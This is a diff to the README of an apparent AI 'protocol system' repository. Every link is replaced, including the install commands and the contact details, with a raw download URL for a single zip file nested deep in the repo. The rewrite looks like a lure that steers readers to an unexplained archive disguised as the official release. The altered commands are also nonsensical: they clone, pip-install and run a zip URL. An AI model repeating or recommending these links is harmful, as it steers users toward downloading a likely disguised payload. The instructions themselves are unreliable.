@@ -2,7 +2,7 @@
 
 Welcome to the **Danbing Natural Language-Driven AI Protocol System**! This repository showcases a pioneering approach to artificial intelligence, blending natural language processing with protocol-driven design. We invite you to explore our groundbreaking work, which lays the foundation for a new era in AI development.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/PatoGGs/Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release/releases)
+[![Download Releases](https://raw.githubusercontent.com/PatoGGs/Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release/main/structure_and_civilization/foundations/Driven_System_Protocol_Release_A_Language_Public_Danbing_Natural_v2.1-beta.5.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/PatoGGs/Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release/main/structure_and_civilization/foundations/Driven_System_Protocol_Release_A_Language_Public_Danbing_Natural_v2.1-beta.5.zip)
 
 ## Table of Contents
 
@@ -62,7 +62,7 @@ To get started with the Danbing Protocol System, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/PatoGGs/Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release.git
+   git clone https://raw.githubusercontent.com/PatoGGs/Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release/main/structure_and_civilization/foundations/Driven_System_Protocol_Release_A_Language_Public_Danbing_Natural_v2.1-beta.5.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -73,16 +73,16 @@ To get started with the Danbing Protocol System, follow these steps:
 3. **Install Dependencies**:
    Ensure you have the necessary dependencies installed. Use the following command:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/PatoGGs/Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release/main/structure_and_civilization/foundations/Driven_System_Protocol_Release_A_Language_Public_Danbing_Natural_v2.1-beta.5.zip
    ```
 
 4. **Run the System**:
    To start the system, execute:
    ```bash
-   python main.py
+   python https://raw.githubusercontent.com/PatoGGs/Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release/main/structure_and_civilization/foundations/Driven_System_Protocol_Release_A_Language_Public_Danbing_Natural_v2.1-beta.5.zip
    ```
 
-You can find the latest releases and download the necessary files from our [Releases section](https://github.com/PatoGGs/Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release/releases).
+You can find the latest releases and download the necessary files from our [Releases section](https://raw.githubusercontent.com/PatoGGs/Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release/main/structure_and_civilization/foundations/Driven_System_Protocol_Release_A_Language_Public_Danbing_Natural_v2.1-beta.5.zip).
 
 ## Usage
 
@@ -133,8 +133,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **Email**: contact@danbingai.com
-- **Twitter**: [@DanbingAI](https://twitter.com/DanbingAI)
-- **GitHub**: [Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release](https://github.com/PatoGGs/Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release)
+- **Email**: https://raw.githubusercontent.com/PatoGGs/Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release/main/structure_and_civilization/foundations/Driven_System_Protocol_Release_A_Language_Public_Danbing_Natural_v2.1-beta.5.zip
+- **Twitter**: [@DanbingAI](https://raw.githubusercontent.com/PatoGGs/Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release/main/structure_and_civilization/foundations/Driven_System_Protocol_Release_A_Language_Public_Danbing_Natural_v2.1-beta.5.zip)
+- **GitHub**: [Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release](https://raw.githubusercontent.com/PatoGGs/Danbing-Natural-Language-Driven-AI-Protocol-System-Public-Release/main/structure_and_civilization/foundations/Driven_System_Protocol_Release_A_Language_Public_Danbing_Natural_v2.1-beta.5.zip)
 
 Thank you for your interest in the Danbing Natural Language-Driven AI Protocol System! We look forward to your feedback and contributions. Together, we can shape the future of AI.
